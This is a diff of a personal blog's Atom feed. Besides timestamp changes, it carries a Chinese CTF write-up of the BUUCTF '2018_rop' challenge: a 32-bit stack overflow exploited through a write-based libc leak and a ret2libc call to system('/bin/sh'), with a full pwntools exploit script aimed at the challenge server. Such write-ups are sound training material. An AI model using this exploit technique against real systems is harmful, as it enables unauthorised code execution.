@@ -6,7 +6,7 @@
   <link href="https://pr0b1em.github.io/atom.xml" rel="self"/>
   
   <link href="https://pr0b1em.github.io/"/>
-  <updated>2021-06-25T03:05:00.265Z</updated>
+  <updated>2021-06-25T03:09:54.253Z</updated>
   <id>https://pr0b1em.github.io/</id>
   
   <author>
@@ -21,20 +21,12 @@
     <link href="https://pr0b1em.github.io/2021/06/25/%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9-%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA-2018-rop/"/>
     <id>https://pr0b1em.github.io/2021/06/25/%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9-%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA-2018-rop/</id>
     <published>2021-06-25T03:02:12.000Z</published>
-    <updated>2021-06-25T03:05:00.265Z</updated>
+    <updated>2021-06-25T03:09:54.253Z</updated>
     
     <content type="html"><![CDATA[<span id="more"></span><h2 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h2><p>查看保护机制，开了NX，32位</p><p><img src="/img/image-20210625101308461.png" alt="image-20210625101308461"></p><p>IDA打开，shift+F12查找字符串，没有发现/bin/sh</p><p><img src="/img/image-20210625101526643.png" alt="image-20210625101526643"></p><p>再查看main函数中，东西不多，挨个查看里面的函数，发现vulnerable_function();函数里面有蹊跷</p><p><img src="/img/image-20210625101817170.png" alt="image-20210625101817170"></p><p>这里发现漏洞，read的buf长度为0x100，而写入的参数大小是0x88，能溢出0x78个长度，足够构造rop攻击 </p><p><img src="/img/image-20210625101909489.png" alt="image-20210625101909489"></p><p>先通过write函数地址泄露出libc版本，然后再在libc版本里算出system函数和/bin/sh的地址，最后通过栈溢出覆盖返回地址填上system(‘/bin/sh’)，夺权。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28086</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">0</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">write_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">offset=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system_addr)+p32(<span class="number">0</span>)+p32(bin_sh)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>脚本一跑，cat flag就得到flag了</p><p><img src="/img/image-20210625105710279.png" alt="image-20210625105710279"></p>]]></content>
     
     
-    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;
-&lt;h2 id=&quot;铁人三项-第五赛区-2018-rop&quot;&gt;&lt;a href=&quot;#铁人三项-第五赛区-2018-rop&quot; class=&quot;headerlink&quot; title=&quot;铁人三项(第五赛区)_2018_rop&quot;&gt;&lt;/a&gt;铁人三项(第五赛区)_2018_rop&lt;/h2&gt;&lt;p&gt;查看保护机制，开了NX，32位&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;/img/image-20210625101308461.png&quot; alt=&quot;image-20210625101308461&quot;&gt;&lt;/p&gt;
-&lt;p&gt;IDA打开，shift+F12查找字符串，没有发现/bin/sh&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;/img/image-20210625101526643.png&quot; alt=&quot;image-20210625101526643&quot;&gt;&lt;/p&gt;
-&lt;p&gt;再查看main函数中，东西不多，挨个查看里面的函数，发现vulnerable_function();函数里面有蹊跷&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;/img/image-20210625101817170.png&quot; alt=&quot;image-20210625101817170&quot;&gt;&lt;/p&gt;
-&lt;p&gt;这里发现漏洞，read的buf长度为0x100，而写入的参数大小是0x88，能溢出0x78个长度，足够构造rop攻击 &lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;/img/image-20210625101909489.png&quot; alt=&quot;image-20210625101909489&quot;&gt;&lt;/p&gt;</summary>
+    <summary type="html">2018_rop</summary>
     
     
     
